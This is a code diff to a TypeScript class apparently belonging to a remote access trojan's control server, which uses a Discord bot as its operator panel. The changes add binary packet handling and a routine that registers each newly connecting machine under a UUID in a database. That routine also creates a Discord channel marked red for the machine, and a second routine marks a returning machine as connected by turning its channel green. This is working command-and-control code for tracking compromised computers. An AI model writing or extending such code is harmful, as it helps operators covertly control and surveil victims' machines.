@@ -1,6 +1,8 @@
 import { Socket } from "net";
 import IRATClient from "../interfaces/IRATClient";
 import RATServer from "./RATServer";
+import TcpPacket from "./TcpPacket";
+import { ChannelType } from "discord.js";
 
 export default class RATClient implements IRATClient {
     connected: boolean;
@@ -20,24 +22,30 @@ export default class RATClient implements IRATClient {
             this.ratServer.removeClient(this);
         });
     }
-    send(data: string): void {
+    send(data: string | Uint8Array): void {
+        
+
+
         this.socket.write(data, (error) => {
             if (error) {
                 console.error(`Error sending data: ${error}`);
             }
         });
     }
-    async receive(): Promise<any> {
+    async receive(): Promise<TcpPacket | undefined> {
         try {
             // Read data from the socket
-            let data = await new Promise<string>((resolve, reject) => {
+            let data = await new Promise<TcpPacket>((resolve, reject) => {
                 this.socket.on('data', (chunk: Buffer) => {
-                    resolve(chunk.toString());
+                    resolve(new TcpPacket(chunk, undefined));
                 });
                 this.socket.on('error', (error: Error) => {
                     reject(error);
                 });
             });
+            if (!data) {
+                throw new Error('No data received');
+            }
             // Process the received data
             return data;
         } catch (error) {
@@ -50,5 +58,72 @@ export default class RATClient implements IRATClient {
 
     disconnect(): void {
         this.socket.destroy();
+    }
+
+    async firstTimeConnect(): Promise<void> {
+        const user = await this.ratServer.client.database.user.create({
+                data: {
+                    channelId: null
+                }
+            });
+            this.send(user.uuid);
+            // Create a channel in a category using category ID
+            const guild = this.ratServer.client.guilds.cache.get(this.ratServer.client.config.guildId) || null;
+            if (!guild) {
+                console.log(`Guild with ID ${this.ratServer.client.config.guildId} not found`);
+                return;
+            }
+            const channel = await guild.channels.create({
+                name: `🔴${user.uuid}`,
+                type: ChannelType.GuildText,
+                parent: this.ratServer.client.config.categoryId
+            });
+            // set the user's channel ID
+            await this.ratServer.client.database.user.update({
+                where: {
+                    uuid: user.uuid
+                },
+                data: {
+                    channelId: channel.id
+                }
+            });
+            this.disconnect();
+            return;
+    }
+
+    async connect(uuid: string): Promise<void> {
+        this.uuid = uuid;
+        const user = await this.ratServer.client.database.user.findUnique({
+            where: {
+                uuid: uuid
+            }
+        });
+        if (!user) {
+            console.log(`User with UUID ${uuid} not found`);
+            this.disconnect();
+            return;
+        }
+
+        // change the user's connected status to true
+        await this.ratServer.client.database.user.update({
+            where: {
+                uuid: uuid
+            },
+            data: {
+                connected: true
+            }
+        });
+        
+        // change the channel name to green
+        //@ts-ignore
+        let channel = this.ratServer.client.channels.cache.get(user.channelId) as TextChannel;
+        if (!channel) {
+            //@ts-ignore
+            channel = await this.ratServer.client.channels.fetch(user.channelId) as TextChannel;
+            if (!channel) {
+                return;
+            }               
+        }
+        await channel.setName(`🟢${channel.name.substring(2, channel.name.length)}`);
     }
 }
